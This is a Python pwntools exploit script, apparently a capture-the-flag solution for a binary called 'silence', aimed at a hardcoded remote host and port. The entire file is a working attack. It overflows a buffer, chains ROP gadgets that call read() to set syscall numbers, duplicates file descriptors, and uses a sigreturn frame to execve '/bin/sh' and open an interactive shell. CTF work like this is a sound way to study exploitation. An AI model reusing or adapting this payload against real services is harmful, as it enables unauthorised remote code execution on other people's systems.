#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./silence', checksec=False)
context.log_level = 'debug'

if args.LOCAL:
	p = process(exe.path)
else:
	p = remote('192.81.209.60', 2023)

bss = 0x404200
syscall = 0x000000000040119e
read_plt = 0x0000000000401090

def rdi(a):
    return p64(0x00000000004012c3)+p64(a)
def rsi(a):
    return p64(0x00000000004012c1)+p64(a)+p64(0)

sysbin = SigreturnFrame()
sysbin.rax = 0x3b
sysbin.rip = syscall
sysbin.rdi = bss+0x100
sysbin.rsi = 0
sysbin.rdx = 0

pl = b'a'*24
## write '/bin/sh' to bss
pl += rdi(0)
pl += rsi(bss+0x100)
pl += p64(read_plt) #sendline('/bin/sh\x00')
## dup2(0,1)
# modify rax value -> 0x21

pl += rdi(0)
pl += rsi(bss)
pl += p64(read_plt) #sendline('a'0x21)

pl += rdi(0)
pl += rsi(1)
pl += p64(syscall)
## dup2(0,2)
pl += rdi(0)
pl += rsi(bss)
pl += p64(read_plt) #sendline('a'0x21)

pl += rdi(0)
pl += rsi(2)
pl += p64(syscall)

## sigreturn
# rax -> 0xf
pl += rdi(0)
pl += rsi(bss+0x30)
pl += p64(read_plt)

pl += p64(syscall)
pl += bytes(sysbin)

p.sendline(pl)
sleep(0.5)
p.sendline(b'/bin/sh\x00')
sleep(0.5)
p.sendline(b'a'*0x20) 
sleep(0.5)
p.sendline(b'a'*0x20)
sleep(0.5)
p.sendline(b'a'*0xe)
log.success('Got Shell')
p.interactive()